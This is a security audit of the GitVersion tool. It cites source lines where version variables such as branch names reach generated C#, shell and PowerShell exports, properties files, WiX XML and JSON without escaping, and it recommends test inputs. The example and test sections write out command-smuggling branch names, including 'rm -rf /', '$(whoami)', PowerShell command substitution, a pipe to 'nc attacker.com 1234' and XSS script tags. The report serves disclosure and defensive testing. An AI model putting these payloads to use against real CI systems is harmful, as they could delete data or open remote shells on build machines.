# GitVersion Security Audit - Detailed Code References

This document provides file:line references with code snippets for each vulnerability identified.

## [CRITICAL] 1. GitVersionInformation.cs - Generated C# String Literals

**File:** `src/GitVersion.Output/GitVersionInfo/GitVersionInfoGenerator.cs`

**Generator Logic (lines 53-56):**
```53:56:src/GitVersion.Output/GitVersionInfo/GitVersionInfoGenerator.cs
var lines = variables.OrderBy(x => x.Key).Select(v => string.Format(indentation + addFormat, v.Key, v.Value));
var members = string.Join(FileSystemHelper.Path.NewLine, lines);

var fileContents = string.Format(template, members, targetNamespace, openBracket, closeBracket, indent);
```

**Template File:** `src/GitVersion.Output/GitVersionInfo/AddFormats/GitVersionInformation.cs`
```1:1:src/GitVersion.Output/GitVersionInfo/AddFormats/GitVersionInformation.cs
public const string {0} = "{1}";
```

**Template Output File:** `src/GitVersion.Output/GitVersionInfo/Templates/GitVersionInformation.cs`
```12:14:src/GitVersion.Output/GitVersionInfo/Templates/GitVersionInformation.cs
{0}
{4}}}}{3}
```

**Vulnerability Chain:**
1. `v.Value` (from `GitVersionVariables`) is passed to `string.Format(addFormat, v.Key, v.Value)`
2. `addFormat` = `public const string {0} = "{1}";`
3. Result: `public const string BranchName = "[UNESCAPED_VALUE]";`
4. Attacker branch name `master"; /* code injection */` generates: `public const string BranchName = "master"; /* code injection */";`

**Attack Example:**
```
Branch name: feature/test"; throw new Exception("injection
Generates:   public const string PreReleaseLabel = "feature/test"; throw new Exception("injection";
```

---

## [CRITICAL] 2. AssemblyInfoFileUpdater.cs - Assembly Attributes

**File:** `src/GitVersion.Output/AssemblyInfo/AssemblyInfoFileUpdater.cs`

**AssemblyVersion Injection (lines 67-69):**
```67:69:src/GitVersion.Output/AssemblyInfo/AssemblyInfoFileUpdater.cs
if (!variables.AssemblySemVer.IsNullOrWhiteSpace())
{
    var result = ReplaceOrInsertAfterLastAssemblyAttributeOrAppend(RegexPatterns.Output.AssemblyVersionRegex, fileContents, $"AssemblyVersion(\"{variables.AssemblySemVer}\")", extension);
```

**AssemblyFileVersion Injection (lines 73-75):**
```73:75:src/GitVersion.Output/AssemblyInfo/AssemblyInfoFileUpdater.cs
if (!variables.AssemblySemFileVer.IsNullOrWhiteSpace())
{
    var result = ReplaceOrInsertAfterLastAssemblyAttributeOrAppend(RegexPatterns.Output.AssemblyFileVersionRegex, fileContents, $"AssemblyFileVersion(\"{variables.AssemblySemFileVer}\")", extension);
```

**AssemblyInformationalVersion Injection (lines 81-83):**
```81:83:src/GitVersion.Output/AssemblyInfo/AssemblyInfoFileUpdater.cs
if (!variables.InformationalVersion.IsNullOrWhiteSpace())
{
    var result = ReplaceOrInsertAfterLastAssemblyAttributeOrAppend(RegexPatterns.Output.AssemblyInfoVersionRegex, fileContents, $"AssemblyInformationalVersion(\"{variables.InformationalVersion}\")", extension);
```

**Key Points:**
- Line 69: `$"AssemblyVersion(\"{variables.AssemblySemVer}\")"` - direct interpolation
- Line 75: `$"AssemblyFileVersion(\"{variables.AssemblySemFileVer}\")"` - direct interpolation  
- Line 83: `$"AssemblyInformationalVersion(\"{variables.InformationalVersion}\")"` - direct interpolation

**Vulnerability:** When `ReplaceOrInsertAfterLastAssemblyAttributeOrAppend` is called at line 120, the unescaped string is written to AssemblyInfo file.

**Attack Example:**
```
Version: 1.0.0\")]\n[assembly: System.Reflection.AllowPartiallyTrustedCallers
Generates: [assembly: AssemblyInformationalVersion("1.0.0")]\n[assembly: System.Reflection.AllowPartiallyTrustedCallers")]
Result: Injected assembly attribute
```

---

## [CRITICAL] 3. BitBucketPipelines.cs - Bash Export

**File:** `src/GitVersion.BuildAgents/Agents/BitBucketPipelines.cs`

**Bash Export Generation (lines 57-59):**
```57:59:src/GitVersion.BuildAgents/Agents/BitBucketPipelines.cs
var exports = variables
    .Select(variable => $"export GITVERSION_{variable.Key.ToUpperInvariant()}={variable.Value}")
    .ToList();

this.fileSystem.File.WriteAllLines(this.propertyFile, exports);
```

**Vulnerability:** No quoting or escaping of `variable.Value`.

**Attack Example:**
```
BranchName value: "feature/branch'; rm -rf /; echo '"
Generates: export GITVERSION_BRANCHNAME=feature/branch'; rm -rf /; echo '
Result: Arbitrary shell command execution
```

**Shell Metacharacters Unescaped:**
`;` `;` `|` `||` `&` `&&` `$` `$(...)` `` `...` `` `(...)` `[...]` `{...}` `<` `>` `!` `*` `?` `\` `"` `'` newline

---

## [CRITICAL] 4. BitBucketPipelines.cs - PowerShell String

**File:** `src/GitVersion.BuildAgents/Agents/BitBucketPipelines.cs`

**PowerShell Export Generation (lines 61-63):**
```61:63:src/GitVersion.BuildAgents/Agents/BitBucketPipelines.cs
var psExports = variables
    .Select(variable => $"$GITVERSION_{variable.Key.ToUpperInvariant()} = \"{variable.Value}\"")
    .ToList();

this.fileSystem.File.WriteAllLines(this.ps1File, psExports);
```

**Vulnerability:** Value inside double quotes without escaping. PowerShell interprets `$`, `` ` ``, and `(...)` in double-quoted strings.

**Attack Example:**
```
BranchName value: "feature/$(whoami)"
Generates: $GITVERSION_BRANCHNAME = "feature/$(whoami)"
Result: PowerShell command substitution - executes whoami
```

**PowerShell Metacharacters Unescaped in Double Quotes:**
`$variableName` `$(...)` `` `...` `` `...` (backtick for escaping/line continuation)

---

## [HIGH] 5. GitLabCi.cs - Properties Format

**File:** `src/GitVersion.BuildAgents/Agents/GitLabCi.cs`

**Properties Output (lines 22-24):**
```22:24:src/GitVersion.BuildAgents/Agents/GitLabCi.cs
public override string[] SetOutputVariables(string name, string? value) =>
[
    $"GitVersion_{name}={value}"
];
```

**Written to File (lines 50-57):**
```50:57:src/GitVersion.BuildAgents/Agents/GitLabCi.cs
if (this.file is null)
{
    return;
}

base.WriteIntegration(writer, variables, updateBuildNumber);
writer($"Outputting variables to '{this.file}' ... ");

this.fileSystem.File.WriteAllLines(this.file, SetOutputVariables(variables));
```

**Vulnerability:** No escaping of newlines in properties format.

**Attack Example:**
```
BranchName value: "feature\nGitVersion_Injected=pwned"
Generates: GitVersion_BranchName=feature
GitVersion_Injected=pwned
Result: Injected new property into the file
```

---

## [HIGH] 6. Jenkins.cs - Properties Format

**File:** `src/GitVersion.BuildAgents/Agents/Jenkins.cs`

**Properties Output (lines 20-21):**
```20:21:src/GitVersion.BuildAgents/Agents/Jenkins.cs
public override string[] SetOutputVariables(string name, string? value) =>
[
    $"GitVersion_{name}={value}"
];
```

**Written via (lines 40-48):**
```40:48:src/GitVersion.BuildAgents/Agents/Jenkins.cs
public override void WriteIntegration(Action<string?> writer, GitVersionVariables variables, bool updateBuildNumber = true)
{
    if (this.file is null)
    {
        return;
    }

    base.WriteIntegration(writer, variables, updateBuildNumber);
    writer($"Outputting variables to '{this.file}' ... ");
    this.fileSystem.File.WriteAllLines(this.file, SetOutputVariables(variables));
}
```

**Vulnerability:** Same as GitLabCi — unescaped properties format.

---

## [HIGH] 7. Drone.cs - Properties Format

**File:** `src/GitVersion.BuildAgents/Agents/Drone.cs`

**Properties Output (lines 16-18):**
```16:18:src/GitVersion.BuildAgents/Agents/Drone.cs
public override string[] SetOutputVariables(string name, string? value) =>
[
    $"GitVersion_{name}={value}"
];
```

**Vulnerability:** Same as GitLabCi and Jenkins.

---

## [HIGH] 8. CodeBuild.cs - Properties Format

**File:** `src/GitVersion.BuildAgents/Agents/CodeBuild.cs`

**Properties Output (lines 22-24):**
```22:24:src/GitVersion.BuildAgents/Agents/CodeBuild.cs
public override string[] SetOutputVariables(string name, string? value) =>
[
    $"GitVersion_{name}={value}"
];
```

**Written to file (lines 32-42):**
```32:42:src/GitVersion.BuildAgents/Agents/CodeBuild.cs
public override void WriteIntegration(Action<string?> writer, GitVersionVariables variables, bool updateBuildNumber = true)
{
    if (this.file is null)
    {
        return;
    }

    base.WriteIntegration(writer, variables, updateBuildNumber);
    writer($"Outputting variables to '{this.file}' ... ");
    this.fileSystem.File.WriteAllLines(this.file, SetOutputVariables(variables));
}
```

**Vulnerability:** Same as GitLabCi, Jenkins, and Drone.

---

## [HIGH] 9. VersionVariablesJsonContext.cs - UnsafeRelaxedJsonEscaping

**File:** `src/GitVersion.Output/Serializer/VersionVariablesJsonContext.cs`

**Configuration (lines 7-17):**
```7:17:src/GitVersion.Output/Serializer/VersionVariablesJsonContext.cs
[JsonSourceGenerationOptions(
    WriteIndented = true,
    DefaultIgnoreCondition = JsonIgnoreCondition.Never,
    Converters = [typeof(VersionVariablesJsonStringConverter)])]
[JsonSerializable(typeof(VersionVariablesJsonModel))]
[JsonSerializable(typeof(Dictionary<string, string>))]
internal partial class VersionVariablesJsonContext : JsonSerializerContext
{
    public static VersionVariablesJsonContext Custom => field ??= new JsonSerializerContext(
        new JsonSerializerOptions(Default.Options)
        {
            Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping
        });
}
```

**Vulnerability:** Line 16 uses `JavaScriptEncoder.UnsafeRelaxedJsonEscaping` which does not escape:
- `<` (U+003C)
- `>` (U+003E)  
- `&` (U+0026)
- `+` (U+002B)
- `'` (U+0027)

These characters are valid in JSON but problematic when embedded in HTML contexts.

**Usage:** `src/GitVersion.Output/Serializer/VersionVariableSerializer.cs` line 25:
```25:25:src/GitVersion.Output/Serializer/VersionVariableSerializer.cs
return JsonSerializer.Serialize(variables, VersionVariablesJsonContext.Custom.VersionVariablesJsonModel);
```

**Attack Example (if JSON rendered in HTML):**
```
Version: 1.0.0<script>alert('xss')</script>
JSON Output: {"FullSemVer":"1.0.0<script>alert('xss')</script>"}
Rendered in HTML without escaping → XSS
```

---

## [HIGH] 10. WixVersionFileUpdater.cs - XML Injection

**File:** `src/GitVersion.Output/WixUpdater/WixVersionFileUpdater.cs`

**XML Generation (lines 40-50):**
```40:50:src/GitVersion.Output/WixUpdater/WixVersionFileUpdater.cs
private static string GetWixFormatFromVersionVariables(GitVersionVariables variables)
{
    var builder = new StringBuilder();
    builder.Append("<Include xmlns=\"http://schemas.microsoft.com/wix/2006/wi\">\n");
    foreach (var (key, value) in variables.OrderBy(x => x.Key))
    {
        builder.Append("\t<?define ").Append(key).Append("=\"").Append(value).Append("\"?>\n");
    }
    builder.Append("</Include>\n");
    return builder.ToString();
}
```

**Vulnerability:** 
- Line 46: `key` appended without validation - can be variable name with XML special characters
- Line 46: `value` appended without escaping - can contain quotes and XML injection

**Attack Example:**
```
Key: "foo" ?>\n<?xml version="1.0"
Value: "1.0.0\" ?><![CDATA[<!-- injected -->"
Generates WIX XML that is malformed or contains injected content
```

**XML Special Characters Not Escaped:**
`"` `<` `>` `&` newlines

---

## [MEDIUM] 11. EnvRun.cs - EnvRun Message Format

**File:** `src/GitVersion.BuildAgents/Agents/EnvRun.cs`

**Output Format (lines 32-33):**
```32:33:src/GitVersion.BuildAgents/Agents/EnvRun.cs
public override string[] SetOutputVariables(string name, string? value) =>
[
    $"@@envrun[set name='GitVersion_{name}' value='{value}']"
];
```

**Vulnerability:** Single-quoted context allows breakout via single quote in value.

**Attack Example:**
```
Value: "1.0.0' ; arbitrary command ; echo '"
Generates: @@envrun[set name='GitVersion_Version' value='1.0.0' ; arbitrary command ; echo '']
```

---

## [MEDIUM] 12. AzurePipelines.cs - Regex Replacement Injection

**File:** `src/GitVersion.BuildAgents/Agents/AzurePipelines.cs`

**Build Number Processing (lines 62-70):**
```62:70:src/GitVersion.BuildAgents/Agents/AzurePipelines.cs
private static string ReplaceVariables(string buildNumberEnv, KeyValuePair<string, string?> variable)
{
    var pattern = $@"\$\(GITVERSION[_\.]{variable.Key}\)";
    var replacement = variable.Value;
    return replacement switch
    {
        null => buildNumberEnv,
        _ => buildNumberEnv.RegexReplace(pattern, replacement)
    };
}
```

**RegexReplace Extension:** `src/GitVersion.Core/Extensions/StringExtensions.cs` line 21-24:
```21:24:src/GitVersion.Core/Extensions/StringExtensions.cs
public string RegexReplace(string pattern, string replace)
{
    var regex = RegexPatterns.Cache.GetOrAdd(pattern);
    return regex.Replace(input, replace);
}
```

**Vulnerability:** The `replacement` parameter (line 70) is passed directly to `Regex.Replace()`. While .NET doesn't interpret replacement as a regex pattern, it does interpret replacement group references like `$0`, `$1`, `$&`, etc.

**Attack Example:**
```
Version value: "$&"
Build number template: "Build-$(GITVERSION_FullSemVer)"
After regex replace: "Build-Build-$(GITVERSION_FullSemVer)" (captures entire match)

More dangerous:
Version value: "${version}"
If ${version} evaluates to something unexpected, could leak internal data
```

---

## Variable Flow Analysis

**Where Attacker-Influenced Data Enters:**

1. **Git Repository Metadata:**
   - Branch names → `BranchName` → flows to all 8 properties-format agents + JSON + shell
   - Tags → `PreReleaseLabel` → flows to all outputs
   - Commit messages → `InformationalVersion` → flows to assembly info, generated code, all outputs
   - Commit SHA → `Sha` → flows to all outputs (low risk, hex-only)

2. **Configuration Files (GitVersion.yml):**
   - Custom version format → custom version string
   - Release branch regex patterns
   - Label names

3. **CLI Arguments:**
   - Branch override
   - Tag override

**All flows eventually reach GitVersionVariables which is used by:**
- `GitVersionInfoGenerator` → source code
- `AssemblyInfoFileUpdater` → assembly info
- `WixVersionFileUpdater` → WIX XML
- All build agents → environment variable output
- `VersionVariableSerializer` → JSON output

---

## Validation and Testing Recommendations

**Test Cases by Vulnerability Type:**

### Generated Code (C#/VB/F#)
```
Branch: master"; throw Exception("
Branch: master"; --comment
Branch: master"/**/""/**/
Branch: master\n[assembly: ...
```

### Shell/Properties Files
```
Branch: master'; rm -rf /; echo '
Branch: master\nGitVersion_Injected=yes
Branch: master$(whoami)
Branch: master`id`
Branch: master|nc attacker.com 1234
```

### PowerShell
```
Branch: master"); Get-Process; echo "
Branch: master$(whoami)
Branch: master`Get-ChildItem`
```

### XML
```
Branch: master" ?><![CDATA[comment]]><?pi "
Branch: master&amp;&lt;&gt;
```

### JSON
```
Version: 1.0.0<script>alert(1)</script>
Version: 1.0.0\" onload=\"alert(1)
```

